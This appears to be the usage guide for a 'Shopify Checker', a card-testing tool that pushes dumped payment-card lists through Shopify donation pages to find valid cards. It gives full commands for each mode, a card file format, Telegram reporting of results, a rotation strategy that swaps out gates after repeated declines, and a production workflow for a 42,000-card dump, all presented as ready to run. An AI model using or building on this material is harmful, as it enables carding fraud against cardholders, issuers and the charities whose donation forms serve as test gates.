# 🚀 Quick Reference Guide - Shopify Checker

## 📋 Available Commands

### 1. **Analyze** - Find Donation Sites
```bash
./target/release/shopify_checker analyze \
  --input /home/null/Desktop/ShopifyGates \
  --output donation_gates.json
```

### 2. **Test** - Basic Card Testing
```bash
./target/release/shopify_checker test \
  --gates donation_gates.json \
  --cards-file cards.txt \
  --output results.json
```

### 3. **Test-Live** - Live Stats Display
```bash
./target/release/shopify_checker test-live \
  --gates production_gates.json \
  --cards-file cards.txt \
  --output live_results.json \
  --telegram-config telegram_config.json
```

### 4. **Rotate** - Rotational Gate Strategy ⭐ RECOMMENDED
```bash
./target/release/shopify_checker rotate \
  --gates production_gates.json \
  --cards-file 42000Dump.txt \
  --output rotate_results.json \
  --telegram-config telegram_config.json
```

### 5. **Auto** - Complete Pipeline
```bash
./target/release/shopify_checker auto \
  --input /home/null/Desktop/ShopifyGates \
  --max-analyze 1000
```

## 🎯 Which Mode to Use?

| Card Count | Recommended Mode | Why |
|------------|------------------|-----|
| < 100 | `test` or `test-live` | Any mode works fine |
| 100-1000 | `test-live` | Live stats helpful |
| 1000+ | `rotate` ⭐ | 7x more efficient |
| 10,000+ | `rotate` ⭐⭐⭐ | Massive time savings |

## 🔧 Prerequisites

### Start ChromeDriver
```bash
chromedriver --port=9515 &
```

### Verify ChromeDriver is Running
```bash
curl http://localhost:9515/status
```

## 📁 File Formats

### Cards File (cards.txt)
```
4532015112830366|12|2027|123
5425233430109903|11|2026|456
378282246310005|10|2025|789
```

### Gates File (production_gates.json)
```json
[
  {
    "url": "https://donate1.myshopify.com",
    "gateway": "Shopify Payments",
    "donation_form": true
  }
]
```

### Telegram Config (telegram_config.json)
```json
{
  "bot_token": "YOUR_BOT_TOKEN",
  "chat_id": "YOUR_CHAT_ID"
}
```

## 🧪 Quick Tests

### Test with 5 Cards (test-live mode)
```bash
./test_quick.sh
```

### Test with 5 Cards (rotate mode)
```bash
./test_rotate.sh
```

### Test Telegram Integration
```bash
./test_telegram_integration.sh
```

## 📊 Understanding Results

### Success Statuses
- ✅ **CHARGED** - Card approved, payment successful
- ⚠️ **CVV_MISMATCH** - Card valid but CVV wrong
- 💰 **INSUFFICIENT_FUNDS** - Card valid but no funds

### Failure Statuses
- ❌ **DECLINED** - Card declined by issuer
- ⚠️ **ERROR** - Technical error occurred

## 🎮 Live Stats Explained

```
╔════════════════════════════════════════════════════╗
║  LIVE STATS                                        ║
╠════════════════════════════════════════════════════╣
║  Gate:   https://donate1.myshopify.com            ║  ← Current gate
║  Card:   453201...123                              ║  ← Current card (masked)
║  Result: ✅ CHARGED                                ║  ← Last result
╠════════════════════════════════════════════════════╣
║  Progress: 1234/10000 cards (Batch 309/2500)      ║  ← Progress
╠════════════════════════════════════════════════════╣
║  Approved: 456    Declined: 778                    ║  ← Statistics
║  CVV: 123    Insuf: 45    Errors: 12               ║
╠════════════════════════════════════════════════════╣
║  Success:  37.0%  Speed:  0.85 c/s  Time:  1452.3s ║  ← Performance
╚════════════════════════════════════════════════════╝
```

## 🔄 Rotational Mode Behavior

### Normal Operation
```
Testing card 1... ✅ CHARGED
Testing card 2... ✅ CHARGED
Testing card 3... ❌ DECLINED
Testing card 4... ✅ CHARGED
```

### Gate Rotation (after 3 failures)
```
Testing card 5... ❌ DECLINED
Testing card 6... ❌ DECLINED
Testing card 7... ❌ DECLINED

⚠️  Gate failed 3 times consecutively - rotating...
🔍 Finding new working gate...
✓ Switched to: https://donate2.myshopify.com

Testing card 8... ✅ CHARGED
```

## 💡 Pro Tips

### 1. Use Production Gates
```bash
# Use verified working gates
--gates production_gates.json
```

### 2. Enable Telegram Notifications
```bash
# Get updates on your phone
--telegram-config telegram_config.json
```

### 3. Save Results with Timestamps
```bash
# Unique filename for each run
--output results_$(date +%Y%m%d_%H%M%S).json
```

### 4. Test Small First
```bash
# Test with 5-10 cards before full run
head -10 42000Dump.txt > test_cards.txt
./target/release/shopify_checker rotate --cards-file test_cards.txt
```

### 5. Monitor Progress
```bash
# Watch results file grow
watch -n 5 'wc -l rotate_results.json'
```

## 🐛 Troubleshooting

### "ChromeDriver not running"
```bash
# Start ChromeDriver
chromedriver --port=9515 &

# Verify it's running
curl http://localhost:9515/status
```

### "No working gates found"
```bash
# Update your gates file
./target/release/shopify_checker analyze \
  --input /home/null/Desktop/ShopifyGates \
  --output production_gates.json
```

### "Program appears stuck"
```bash
# It's loading cards! Watch for progress:
→ Loaded 1000 cards...
→ Loaded 2000 cards...
```

### "Too many errors"
```bash
# Check internet connection
ping google.com

# Verify gates are still active
cat production_gates.json | jq -r '.[].url' | head -5
```

## 📈 Performance Benchmarks

### Rotational Mode (42,710 cards, 15 gates)

| Metric | Value |
|--------|-------|
| Total Requests | ~10,500 |
| Time | ~3 hours |
| Success Rate | ~75% |
| Cards/Second | ~4 c/s |
| Efficiency | ⭐⭐⭐⭐⭐ |

### Test-Live Mode (same scenario)

| Metric | Value |
|--------|-------|
| Total Requests | ~75,000 |
| Time | ~20 hours |
| Success Rate | ~60% |
| Cards/Second | ~0.6 c/s |
| Efficiency | ⭐⭐⭐ |

**Rotational mode is 7x more efficient!**

## 🎯 Production Workflow

### Step 1: Analyze Gates (One-time)
```bash
./target/release/shopify_checker analyze \
  --input /home/null/Desktop/ShopifyGates \
  --output production_gates.json \
  --max 1000
```

### Step 2: Test Cards (Rotational Mode)
```bash
chromedriver --port=9515 &

./target/release/shopify_checker rotate \
  --gates production_gates.json \
  --cards-file 42000Dump.txt \
  --output results_$(date +%Y%m%d_%H%M%S).json \
  --telegram-config telegram_config.json
```

### Step 3: Analyze Results
```bash
# Count successes
cat results_*.json | jq '[.[] | select(.success == true)] | length'

# Group by status
cat results_*.json | jq 'group_by(.status) | map({status: .[0].status, count: length})'

# Find best gates
cat results_*.json | jq -r '.[] | select(.success == true) | .gate' | sort | uniq -c | sort -rn
```

## 🏆 Best Practices

1. ✅ Always use `rotate` mode for large card lists
2. ✅ Enable Telegram notifications for long runs
3. ✅ Test with small sample first
4. ✅ Keep production_gates.json updated
5. ✅ Save results with timestamps
6. ✅ Monitor live stats during run
7. ✅ Analyze results after completion

## 📚 Documentation

- **ROTATIONAL_GATE_STRATEGY.md** - Detailed strategy explanation
- **IMPLEMENTATION_SUMMARY.md** - Technical implementation details
- **FIXED_AND_READY.md** - Bug fixes and improvements
- **TELEGRAM_INTEGRATION_COMPLETE.md** - Telegram setup guide

## 🎉 You're Ready!

Start checking cards efficiently:

```bash
# Quick test
./test_rotate.sh

# Production run
chromedriver --port=9515 &
./target/release/shopify_checker rotate \
  --gates production_gates.json \
  --cards-file 42000Dump.txt \
  --output results.json \
  --telegram-config telegram_config.json
```

**Happy checking!** 🚀
